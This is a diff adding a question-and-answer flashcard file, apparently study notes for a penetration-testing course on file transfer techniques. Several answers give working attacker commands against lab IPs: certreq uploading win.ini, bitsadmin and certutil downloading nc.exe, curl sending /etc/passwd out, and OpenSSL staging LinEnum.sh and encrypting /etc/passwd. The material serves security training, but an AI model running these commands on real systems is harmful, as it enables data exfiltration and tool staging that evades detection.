@@ -1,0 +1,33 @@
+Who coined the phrase "Living off the Land"? | Christopher Campbell (@obscuresec) & Matt Graeber (@mattifestation) at DerbyCon 3
+What does LOLBins stand for? | Living off the Land binaries
+What are the two main websites for LOLBins? | LOLBAS Project for Windows Binaries and GTFOBins for Linux Binaries
+What functions can Living off the Land binaries perform? | Download, Upload, Command Execution, File Read, File Write, Bypasses
+What URL paths can you search for download/upload functions in LOLBAS? | /download or /upload
+What URL searches can you use for download/upload functions in GTFOBins? | +file download or +file upload
+What certreq.exe command uploads a file? | certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+What OpenSSL command creates a certificate? | openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+What OpenSSL command starts a server to send files? | openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+What OpenSSL command downloads a file from a server? | openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+What does BITS stand for? | Background Intelligent Transfer Service
+What bitsadmin command downloads a file? | bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+What PowerShell command uses BITS to download a file? | Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+What certutil command downloads a file? | certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+Who found that Certutil can download arbitrary files? | Casey Smith (@subTee)
+What interface currently detects malicious Certutil usage? | Antimalware Scan Interface (AMSI)
+What directory should be created for Nginx uploads? | /var/www/uploads/SecretUploadDirectory
+What user should own the Nginx upload directory? | www-data
+What port does the Nginx upload configuration use? | 9001
+What HTTP method does Nginx use for file uploads? | PUT
+What curl command uploads a file using PUT? | curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+What PowerShell script provides AES encryption? | Invoke-AESEncryption.ps1
+What are the two modes for Invoke-AESEncryption? | Encrypt and Decrypt
+What file extension does Invoke-AESEncryption add to encrypted files? | .aes
+What PowerShell command encrypts a file with Invoke-AESEncryption? | Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+What OpenSSL command encrypts a file with AES-256? | openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+What OpenSSL command decrypts an AES-256 encrypted file? | openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+What cipher is used in the OpenSSL encryption example? | aes256 (AES-256-CBC)
+What key derivation function does the OpenSSL example use? | PBKDF2 (Password-Based Key Derivation Function 2)
+How many iterations does the OpenSSL encryption example use? | 100000
+What are the recommended secure transport methods for encrypted files? | HTTPS, SFTP, SSH
+What is the default Nginx configuration file that binds to port 80? | /etc/nginx/sites-enabled/default
+What log file shows Nginx errors? | /var/log/nginx/error.log
